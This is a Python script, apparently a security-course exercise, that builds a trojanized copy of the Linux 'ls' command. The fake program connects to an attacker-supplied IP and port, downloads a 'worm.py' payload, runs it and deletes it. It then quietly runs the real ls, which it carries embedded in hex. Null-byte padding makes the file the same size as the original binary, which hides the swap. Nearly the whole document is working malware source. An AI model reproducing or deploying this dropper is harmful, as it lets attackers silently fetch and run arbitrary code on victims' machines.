#!/usr/bin/python3
import os, sys, base64, subprocess, binascii, shutil
from zipfile import ZipFile

def zip_ls():
    shutil.make_archive("/tmp/ls", 'zip', "/usr/bin/ls")
    with open("/tmp/ls.zip", "rb") as f:
        return f.read()

def build_virus(atkip: str, atkport: int, ls_zip: bytes):
    # b64 = base64.b64encode(ls_zip)
    ls_hex = binascii.hexlify(ls_zip)


    code = f"""#!/usr/bin/python3
import sys, os, socket, base64, binascii
from zipfile import ZipFile
import shutil

ls_bytes = {ls_hex}.decode('utf-8')

def get_worm(ip, pt):
    skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    skt.connect((ip, pt))
    rcv_f = 'worm.py'
    with open(rcv_f, 'wb') as f:
        while True:
            data = skt.recv(1024)
            if not data:
                break
            f.write(data)
    skt.close()

def run():
    get_worm("{atkip}", {atkport})
    os.system("python3 worm.py && rm worm.py")

    orig_ls = binascii.unhexlify(ls_bytes)
    with open("/tmp/ls.zip", 'wb') as f:
        f.write(orig_ls)
    with ZipFile("/tmp/ls.zip", "r") as f:
        f.extractall("/tmp/")
    os.system("rm /tmp/ls.zip && chmod +x /tmp/ls")
    ret = os.system("/tmp/ls "+" ".join(sys.argv[1:]))
    os.system("rm /tmp/ls")
    return ret
    
if __name__ == "__main__":
    run()
    """

    ls_size = os.path.getsize("/usr/bin/ls")
    with open("fake_ls", "wb") as f:
        f.write(code.encode())
    new_size = os.path.getsize("fake_ls")
    with open("fake_ls", "ab") as f: # append byte mode
        f.write(b'\x00' * (ls_size - new_size - 4))
        f.write(b'\xaa\xbb\xcc\xdd')
    # print("new size:", new_size)
    # print("original size:", ls_size)

